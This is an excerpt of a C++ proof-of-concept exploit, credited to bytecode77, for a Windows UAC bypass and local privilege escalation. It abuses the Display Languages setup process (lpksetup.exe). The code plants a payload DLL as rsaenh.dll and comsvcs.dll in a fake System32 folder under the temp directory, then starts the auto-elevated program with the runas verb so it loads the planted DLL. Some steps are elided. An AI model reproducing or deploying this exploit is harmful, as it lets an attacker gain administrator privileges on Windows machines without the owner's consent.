 ...
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ║                                                                                      ║
 * ║   Display Languages Volatile Environment UAC Bypass Local Privilege Escalation       ║
 * ║                                                                                      ║
 * ║   Discovered by bytecode77 (https://bytecode77.com)                                  ║
 * ║                                                                                      ║
 * ║   Full Download:                                                                     ║
 * ║   https://bytecode77.com/display-languages-privilege-escalation                      ║
 * ║                                                                                      ║
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 ...
 * ║                                                                                      ║
 * ║   A load attempt to %SYSTEMROOT%\System32\ + either "rsaenh.dll" or "comsvcs.dll"    ║
 * ║   (depending on OS version) will be performed from this auto-elevated process.       ║
 * ║                                                                                      ║
...
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	...
	wstring systemRoot = GetTempFolderPath() + L"\\DisplayLanguagesVolatileEnvironmentLPE";
	...
	// This is our DLL that is loaded and then executed as either "rsaenh.dll" or "comsvcs".dll"
	CopyFileW((GetStartupPath() + L"\\DisplayLanguagesInject.dll").c_str(), (systemRoot + L"\\System32\\rsaenh.dll").c_str(), FALSE);
	CopyFileW((GetStartupPath() + L"\\DisplayLanguagesInject.dll").c_str(), (systemRoot + L"\\System32\\comsvcs.dll").c_str(), FALSE);
	...
	// Execute lpksetup.exe with runas verb
	// Continue reading in DisplayLanguagesInject.cpp
	ShellExecuteW(NULL, L"runas", L"lpksetup.exe", NULL, NULL, SW_SHOWNORMAL);
	return 0;
}
